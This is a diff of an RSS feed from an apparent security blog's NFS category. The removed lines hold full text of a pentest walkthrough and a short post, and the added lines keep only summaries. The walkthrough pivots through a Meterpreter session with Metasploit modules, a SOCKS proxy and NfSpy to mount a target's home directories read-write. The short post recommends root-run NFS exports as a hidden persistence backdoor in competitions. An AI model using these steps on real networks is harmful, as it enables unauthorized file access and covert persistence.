@@ -1,164 +1,25 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>nfs on malicious.link</title>
-    <link>https://malicious.link/categories/nfs/</link>
-    <description>Recent content in nfs on malicious.link</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Mon, 04 Mar 2013 21:20:19 +0000</lastBuildDate>
-    
-        <atom:link href="https://malicious.link/categories/nfs/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>Mounting NFS shares through Meterpreter with NfSpy</title>
-      <link>https://malicious.link/post/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/</link>
-      <pubDate>Mon, 04 Mar 2013 21:20:19 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/</guid>
-      <description>&lt;p&gt;You&amp;rsquo;ve found an NFS share on a pentest, it&amp;rsquo;s sharing out your target&amp;rsquo;s home directories (/home) and some SAN with all of the Windows AD users &amp;ldquo;home&amp;rdquo; directories under /volumes/users/. You only have a meterpreter session though&amp;hellip; enough back story, problem is that Metasploit doesn&amp;rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&amp;rsquo;m wrong, but there also aren&amp;rsquo;t any tools for talking to NFS shares over TCP only proxies.&lt;/p&gt;
-&lt;p&gt;Enter NfSpy: &lt;a href=&#34;https://github.com/bonsaiviking/NfSpy&#34;&gt;https://github.com/bonsaiviking/NfSpy&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;While it&amp;rsquo;s original intent was aide in bypassing NFS security controls it has the right amount of options to make mounting NFS over Meterpreter possible.&lt;/p&gt;
-&lt;p&gt;First we setup up our route so that the aux module will go over the meterpreter session:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;route add 192.168.1.0 255.255.255.0 1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The 1 on the end being the meterpreter session number it&amp;rsquo;s going to be going through. Next up is to find out what exports are available:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/nfs/nfsmount
-msf auxiliary(nfsmount) &amp;gt; show options
-
-Module options (auxiliary/scanner/nfs/nfsmount):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   RHOSTS                    yes       The target address range or CIDR identifier
-   RPORT    111              yes       The target port
-   THREADS  1                yes       The number of concurrent threads&amp;lt;
-
-msf auxiliary(nfsmount) &amp;gt; set RHOSTS 192.168.1.50
-RHOSTS =&amp;gt; 192.168.1.50
-msf auxiliary(nfsmount) &amp;gt; run
-[+] 192.168.1.50 NFS Export: /home [192.168.1.0/24]
-[+] 192.168.1.50 NFS Export: /volume/users [192.168.1.0/24]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like access is restricked by IP range, but luckily the victim is in said range. The final piece of information we need is the TCP port(s) that mountd is listening on. There is a metasploit module that can help use there too:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/misc/sunrpc_portmapper
-msf auxiliary(sunrpc_portmapper) &amp;gt; show options
-
-Module options (auxiliary/scanner/misc/sunrpc_portmapper):
-
-   Name     Current Setting  Required  Description&amp;lt;
-   ----     ---------------  --------  -----------
-   RHOSTS                    yes       The target address range or CIDR identifier
-   RPORT    111              yes       The target port
-   THREADS  1                yes       The number of concurrent threads
-
-msf auxiliary(sunrpc_portmapper) &amp;gt; set RHOSTS 192.168.1.50
-RHOSTS =&amp;gt; 192.168.1.50
-msf auxiliary(sunrpc_portmapper) &amp;gt; run
-
-[+] 192.168.1.50 - Programs available
-        rpcbind - 111/tcp
-        rpcbind - 111/udp
-        status - 46797/udp
-        status - 55731/tcp
-        nfs - 2049/tcp
-        nfs_acl - 2049/tcp
-        nfs - 2049/udp
-        nfs_acl - 2049/udp
-        nlockmgr - 54167/udp
-        nlockmgr - 38216/tcp
-        mountd - 52569/udp&amp;lt;
-        mountd - 37719/tcp
-        mountd - 39099/udp
-        mountd - 55763/tcp
-        mountd - 37808/udp
-        mountd - 54457/tcp
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cool, so lets target /home first with the mountd tcp port of 37719. Keeping our route where it is we set up Metasploit&amp;rsquo;s socks proxy:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/server/socks4a
-msf auxiliary(socks4a) &amp;gt; show options
-
-Module options (auxiliary/server/socks4a):
-  Name     Current Setting  Required  Description
-  ----     ---------------  --------  -----------
-  SRVHOST  0.0.0.0          yes       The address to listen on
-  SRVPORT  1080             yes       The port to listen on.
-
-msf auxiliary(socks4a) &amp;gt; set SRVPORT 9050
-SRVPORT =&amp;gt; 9050
-msf auxiliary(socks4a) &amp;gt; set SRVHOST 127.0.0.1
-SRVHOST =&amp;gt; 127.0.0.1
-msf auxiliary(socks4a) &amp;gt; run
-[*] Auxiliary module execution completed
-[*] Starting the socks4a proxy server
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I chose 9050 as my SRVPORT since I have proxychains already set up for that port (ala tor) and I highly recommend setting the SRVHOST to 127.0.0.1, unless you either firewall that port off from the Internet or don&amp;rsquo;t mind having the Anons of the world surf through your meterpreter session into your clients.&lt;/p&gt;
-&lt;p&gt;Next up it actually using nfspy (create or prep a directory so you can mount it first):&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount
-ProxyChains-3.1 (http://proxychains.sf.net)
-FUSE library version: 2.8.6
-nullpath_ok: 0
-unique: 1, opcode: INIT (26), nodeid: 0, insize: 56
-INIT: 7.16
-flags=0x0000007b
-max_readahead=0x00020000
-|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-192.168.1.50:37719-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
-|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:9050-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-192.168.1.50:2049-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
-  INIT: 7.12
-  flags=0x00000011
-  max_readahead=0x00020000
-  max_write=0x00020000
-  unique: 1, success, outsize: 40
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;proxychains nfspy -d -o server=192.168.1.50:/home,nfsport=2049/tcp,mountport=37719/tcp,rw /root/nfspy/mount&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Lets break that command down. Proxychains will wrap nfspy so that it goes through our Metasploit Socks4a proxy. The -d tells NfSpy to stay in the foreground, and -o for options. Server is our target IP, only use a hostname if your attacker box can resolve it to the right IP. The export we found with the Metasploit module is up next, and the default NFS port of 2049. The mountport option is from the port mapper Metasploit module. Both of these port options be sure you specify the /tcp or you&amp;rsquo;ll just be waiting as there isn&amp;rsquo;t really a time out and Proxychains doesn&amp;rsquo;t show UDP attempts. RW for read-write and finally the location to mount to.&lt;/p&gt;
-&lt;p&gt;If you see that second proxychains request for port 2049 it is usually a good indicator that it worked, if not you have probably run into anything from a permissions issue to a local mount problem. NfSpy uses fuse which can be really silent when problems arrise or give errors that tell you nothing meaningful. Thats why I&amp;rsquo;m using the -d option that keeps nfspy in the foreground, just so I can detect any issues. Lets see if that worked:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls /root/nfspy/mount
-user1
-user2
-user3
-user4
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Remember, big directories might take a while to navigate being tunneled like this. Here is the output from the ls on the nfspy side:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;unique: 166, opcode: OPENDIR (27), nodeid: 34, insize: 48
-   unique: 166, success, outsize: 32
-unique: 167, opcode: READDIR (28), nodeid: 34, insize: 80
-readdir[0] from 0
-   unique: 167, success, outsize: 208
-unique: 168, opcode: LOOKUP (1), nodeid: 34, insize: 46
-LOOKUP /home/user3
-getattr /home/user3
-   NODEID: 40
-   unique: 168, success, outsize: 144
-unique: 169, opcode: LOOKUP (1), nodeid: 34, insize: 46
-LOOKUP /home/user1
-getattr /home/user1
-   NODEID: 41
-   unique: 169, success, outsize: 144
-unique: 170, opcode: LOOKUP (1), nodeid: 34, insize: 46
-LOOKUP /home/user4
-getattr /home/user4
-   NODEID: 42
-   unique: 170, success, outsize: 144
-unique: 171, opcode: LOOKUP (1), nodeid: 34, insize: 46
-LOOKUP /home/user2
-getattr /home/user2
-   NODEID: 43
-   unique: 171, success, outsize: 144
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thats it. You can mount read-write (rw) or read-only (ro) depending on what you want to do and how quiet you want to be.&lt;/p&gt;
-&lt;p&gt;Last note, you can&amp;rsquo;t just CTRL-C an nfspy mount, you need to use &lt;code&gt;fusermount -u /root/nfspy/mount&lt;/code&gt; to kill it. It&amp;rsquo;s another fuse issue. If anyone has a better way to do this I&amp;rsquo;m all ears.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Creating Vulnerabilities: NFS Exports</title>
-      <link>https://malicious.link/post/2011/2011-03-01-creating-vulnerabilities-nfs-exports/</link>
-      <pubDate>Tue, 01 Mar 2011 20:40:28 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-03-01-creating-vulnerabilities-nfs-exports/</guid>
-      <description>&lt;p&gt;Constant connections and odd binaries running on systems usually get caught pretty quickly in CCDC events. However, NFS exports are hardly ever noticed. Setting it up on an Ubuntu/Debian box is a snap and given the right directory and permissions can lead you right back to getting shell any time you want without a constant connection. Plus, NFS blends right in and can listen on TCP and/or UDP (2049)&lt;/p&gt;
-&lt;p&gt;Here is a quick how-to on setting up NFS&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://help.ubuntu.com/community/SettingUpNFSHowTo&#34;&gt;https://help.ubuntu.com/community/SettingUpNFSHowTo&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;I&amp;rsquo;m sure you can think of much more evil locations but /etc/, /var/www/, and /root/ are some of my favorite exports, but there is no reason why you couldn&amp;rsquo;t just export &amp;lsquo;/&amp;rsquo; that I know of. (NFSd might not permit it)&lt;/p&gt;
-&lt;p&gt;Remember to change the NFS settings so that it runs as root and you are golden.&lt;/p&gt;
-</description>
-    </item>
-    
-  </channel>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>nfs - Category - Malicious Link - Blog by mubix - Rob Fuller</title>
+        <link>https://malicious.link/categories/nfs/</link>
+        <description>nfs - Category - Malicious Link - Blog by mubix - Rob Fuller</description>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>mubix@hak5.org (Rob Fuller)</managingEditor>
+            <webMaster>mubix@hak5.org (Rob Fuller)</webMaster><lastBuildDate>Mon, 04 Mar 2013 21:20:19 &#43;0000</lastBuildDate><atom:link href="https://malicious.link/categories/nfs/" rel="self" type="application/rss+xml" /><item>
+    <title>Mounting NFS shares through Meterpreter with NfSpy</title>
+    <link>https://malicious.link/posts/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/</link>
+    <pubDate>Mon, 04 Mar 2013 21:20:19 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2013/2013-03-04-mounting-nfs-shares-through-meterpreter-with-nfspy/</guid>
+    <description><![CDATA[You&rsquo;ve found an NFS share on a pentest, it&rsquo;s sharing out your target&rsquo;s home directories (/home) and some SAN with all of the Windows AD users &ldquo;home&rdquo; directories under /volumes/users/. You only have a meterpreter session though&hellip; enough back story, problem is that Metasploit doesn&rsquo;t really have any auxiliary modules or otherwise to access the things on those shares. Please correct me if I&rsquo;m wrong, but there also aren&rsquo;t any tools for talking to NFS shares over TCP only proxies.]]></description>
+</item>
+<item>
+    <title>Creating Vulnerabilities: NFS Exports</title>
+    <link>https://malicious.link/posts/2011/2011-03-01-creating-vulnerabilities-nfs-exports/</link>
+    <pubDate>Tue, 01 Mar 2011 20:40:28 &#43;0000</pubDate>
+    <author>mubix</author>
+    <guid>https://malicious.link/posts/2011/2011-03-01-creating-vulnerabilities-nfs-exports/</guid>
+    <description><![CDATA[Constant connections and odd binaries running on systems usually get caught pretty quickly in CCDC events. However, NFS exports are hardly ever noticed. Setting it up on an Ubuntu/Debian box is a snap and given the right directory and permissions can lead you right back to getting shell any time you want without a constant connection. Plus, NFS blends right in and can listen on TCP and/or UDP (2049)
+Here is a quick how-to on setting up NFS]]></description>
+</item>
+</channel>
 </rss>
